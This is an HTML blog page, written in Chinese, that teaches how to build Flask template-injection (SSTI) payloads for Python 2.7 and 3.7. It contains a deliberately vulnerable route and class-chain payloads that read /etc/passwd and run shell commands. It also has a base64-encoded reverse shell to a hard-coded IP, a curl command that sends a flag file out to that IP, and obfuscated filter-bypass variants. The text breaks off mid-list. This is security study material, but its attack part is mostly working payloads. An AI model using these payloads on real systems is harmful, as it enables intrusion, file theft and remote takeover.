@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.9.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="flask模版注入">
+
+
+
+
+  <meta name="keywords" content="SSTI,">
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/02/24/flask模版注入/">
+
+
+<meta name="keywords" content="SSTI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask模版注入">
+<meta property="og:url" content="https://glotozz.github.io/2020/02/24/flask模版注入/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/e4nIbyOrsGTRVvE.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/opIWP5TdSs7uKCE.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/Mbd1aypGULlEmjK.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/684jbuvrwtiSYKk.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-24_11-21-53.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/ynWGKe9NoX7vJrD.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/4QkOHi6lTNpsA7X.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/v4n2wamzGpJxyct.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
+<meta property="og:updated_time" content="2020-02-24T10:33:39.764Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="flask模版注入">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> flask模版注入 - glotozz'blog </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          flask模版注入
+        
+      </h1>
+
+      <time class="post-time">
+          Feb 24 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<blockquote>
+<p>漏洞原理参考： <a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a> </p>
+</blockquote>
+<p>漏洞原理用一句话概括：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p>
+<hr>
+<p>这篇文章主要是分析自己生成payload，因为理论上不同机器、不同python版本的payload是不尽相同的。</p>
+<p>测试代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def test():</span><br><span class="line">    code = request.args.get(&apos;id&apos;)</span><br><span class="line">    html = &apos;&apos;&apos;</span><br><span class="line">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">    &apos;&apos;&apos;%(code)</span><br><span class="line">    return render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<p>两种启动方式：</p>
+<p><code>flask run --host=0.0.0.0</code>，需要启动的时候设置host，<code>app.run()</code>中更改无效</p>
+<p><code>python app.py</code>，在<code>app.run()</code>中设置host，切换python版本比较方便</p>
+<p>确认正常访问</p>
+<img src="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png" alt="Snipaste_2020-02-24_10-02-29.png" style="zoom:67%;">
+
+<hr>
+<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p><code></code>,比较常见的读取是SECRET_KEY</p>
+<h4 id="文件读取-命令执行"><a href="#文件读取-命令执行" class="headerlink" title="文件读取/命令执行"></a>文件读取/命令执行</h4><p>无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类<code>&lt;type &#39;object&#39;&gt;</code>，再寻找子类，最后找到我们需要用到的相应模块</p>
+<p><strong>几个要用到的魔术方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<p>先测试<strong>Python 2.7.17</strong></p>
+<p>需要先选取一个类，几种常见的类<code>&#39;&#39;</code>、<code>request</code>、<code>[]</code>、<code>()</code></p>
+<p>1、获取类对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__</span><br><span class="line">&lt;type &apos;str&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; import request</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &apos;module&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &apos;tuple&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、寻找基类<code>object</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br><span class="line">&gt;&gt;&gt; request.__class__.__mro__</span><br><span class="line">(&lt;type &apos;module&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &apos;list&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &apos;tuple&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</p>
+</blockquote>
+<p>3、寻找可用的引用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;urlparse.ResultMixin&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;time.struct_time&apos;&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>4、文件读取</p>
+<p><strong>Payload 1</strong></p>
+<p>发现40的地方存在 <code>&lt;type &#39;file&#39;&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line">request.__class__.__mro__[1].__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/e4nIbyOrsGTRVvE.png" alt="Snipaste_2020-02-24_10-16-50.png" style="zoom:67%;">
+
+<p>查下标</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&apos;file&apos;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__():</span><br><span class="line">	<span class="keyword">print</span> num</span><br><span class="line">	<span class="keyword">print</span> item</span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload 2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">59</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p>5、命令执行</p>
+<p>寻找包含<code>os</code>模块的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'os'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             <span class="keyword">print</span> num,item</span><br><span class="line">         num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">-</span><br><span class="line">76 &lt;class &apos;site.Quitter&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面已经找到了包含<code>os</code>模块的类，先初始化，再引用即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/opIWP5TdSs7uKCE.png" alt="Snipaste_2020-02-24_10-39-01.png" style="zoom:67%;">
+
+<p>只不过命令执行没有回显，需要反弹shell或者利用<code>curl</code>带出</p>
+<p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg==|base64 -d|bash&apos;)</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/Mbd1aypGULlEmjK.png" alt="Snipaste_2020-02-24_10-50-06.png" style="zoom:67%;">
+
+<p>curl带出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;data=$(cat /fffffflag | base64);curl http://117.78.1.204/?data=$data;&apos;)</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/684jbuvrwtiSYKk.png" alt="Snipaste_2020-02-24_11-21-53.png" style="zoom:67%;">
+
+<p><code>catch_warnings</code>也可以进一步构造来执行命令 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">59</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先介绍两个属性，已知函数名可获取函数信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x=1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a=x*2</span><br><span class="line">    flag=&apos;neko&apos;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">(None, 2, &apos;neko&apos;)</span><br><span class="line">&#123;&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__file__&apos;: &apos;b.py&apos;, &apos;__package__&apos;: None, &apos;fun&apos;: &lt;function fun at 0x7f1b9317e750&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-24_11-21-53.png" alt="Snipaste_2020-02-24_11-21-53"></p>
+<p>还有几种变形</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&apos;l&apos;+&apos;s&apos;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&apos;catch_warnings&apos;][0]()._module.__builtins__):getthem[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;))()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python 3.7.5</strong></p>
+<p>1、获取类对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__</span><br><span class="line">&lt;class &apos;str&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;class &apos;tuple&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;class &apos;list&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、寻找基类<code>object</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;class &apos;str&apos;&gt;, &lt;class &apos;object&apos;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;class &apos;list&apos;&gt;, &lt;class &apos;object&apos;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;class &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、寻找可用的引用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1].__subclasses__()</span><br><span class="line">[&lt;class &apos;type&apos;&gt;, &lt;class &apos;weakref&apos;&gt;, &lt;class &apos;weakcallableproxy&apos;&gt;, &lt;class &apos;weakproxy&apos;&gt;, &lt;class &apos;int&apos;&gt;, &lt;class &apos;bytearray&apos;&gt;, &lt;class &apos;bytes&apos;&gt;, &lt;class &apos;list&apos;&gt;, &lt;class &apos;NoneType&apos;&gt;, &lt;class &apos;NotImplementedType&apos;&gt;, &lt;class &apos;traceback&apos;&gt;, &lt;class &apos;super&apos;&gt;, &lt;class &apos;range&apos;&gt;, &lt;class &apos;dict&apos;&gt;, &lt;class &apos;dict_keys&apos;&gt;, &lt;class &apos;dict_values&apos;&gt;, &lt;class &apos;dict_items&apos;&gt;, &lt;class &apos;odict_iterator&apos;&gt;, &lt;class &apos;set&apos;&gt;, &lt;class &apos;str&apos;&gt;, &lt;class &apos;slice&apos;&gt;, &lt;class &apos;staticmethod&apos;&gt;, &lt;class &apos;complex&apos;&gt;, &lt;class &apos;float&apos;&gt;, &lt;class &apos;frozenset&apos;&gt;, &lt;class &apos;property&apos;&gt;, &lt;class &apos;managedbuffer&apos;&gt;, &lt;class &apos;memoryview&apos;&gt;, &lt;class &apos;tuple&apos;&gt;, &lt;class &apos;enumerate&apos;&gt;, &lt;class &apos;reversed&apos;&gt;, &lt;class &apos;stderrprinter&apos;&gt;, &lt;class &apos;code&apos;&gt;, &lt;class &apos;frame&apos;&gt;, &lt;class &apos;builtin_function_or_method&apos;&gt;, &lt;class &apos;method&apos;&gt;, &lt;class &apos;function&apos;&gt;, &lt;class &apos;mappingproxy&apos;&gt;, &lt;class &apos;generator&apos;&gt;, &lt;class &apos;getset_descriptor&apos;&gt;, &lt;class &apos;wrapper_descriptor&apos;&gt;, &lt;class &apos;method-wrapper&apos;&gt;, &lt;class &apos;ellipsis&apos;&gt;, &lt;class &apos;member_descriptor&apos;&gt;, &lt;class &apos;types.SimpleNamespace&apos;&gt;, &lt;class &apos;PyCapsule&apos;&gt;, &lt;class &apos;longrange_iterator&apos;&gt;, &lt;class &apos;cell&apos;&gt;, &lt;class &apos;instancemethod&apos;&gt;, &lt;class &apos;classmethod_descriptor&apos;&gt;, &lt;class &apos;method_descriptor&apos;&gt;, &lt;class &apos;callable_iterator&apos;&gt;, &lt;class &apos;iterator&apos;&gt;, &lt;class &apos;coroutine&apos;&gt;, &lt;class &apos;coroutine_wrapper&apos;&gt;, &lt;class &apos;moduledef&apos;&gt;, &lt;class &apos;module&apos;&gt;, &lt;class &apos;EncodingMap&apos;&gt;, &lt;class &apos;fieldnameiterator&apos;&gt;, &lt;class &apos;formatteriterator&apos;&gt;, &lt;class &apos;filter&apos;&gt;, &lt;class &apos;map&apos;&gt;, &lt;class &apos;zip&apos;&gt;, &lt;class &apos;BaseException&apos;&gt;, &lt;class &apos;hamt&apos;&gt;, &lt;class &apos;hamt_array_node&apos;&gt;, &lt;class &apos;hamt_bitmap_node&apos;&gt;, &lt;class &apos;hamt_collision_node&apos;&gt;, &lt;class &apos;keys&apos;&gt;, &lt;class &apos;values&apos;&gt;, &lt;class &apos;items&apos;&gt;, &lt;class &apos;Context&apos;&gt;, &lt;class &apos;ContextVar&apos;&gt;, &lt;class &apos;Token&apos;&gt;, &lt;class &apos;Token.MISSING&apos;&gt;, &lt;class &apos;_frozen_importlib._ModuleLock&apos;&gt;, &lt;class &apos;_frozen_importlib._DummyModuleLock&apos;&gt;, &lt;class &apos;_frozen_importlib._ModuleLockManager&apos;&gt;, &lt;class &apos;_frozen_importlib._installed_safely&apos;&gt;, &lt;class &apos;_frozen_importlib.ModuleSpec&apos;&gt;, &lt;class &apos;_frozen_importlib.BuiltinImporter&apos;&gt;, &lt;class &apos;classmethod&apos;&gt;, &lt;class &apos;_frozen_importlib.FrozenImporter&apos;&gt;, &lt;class 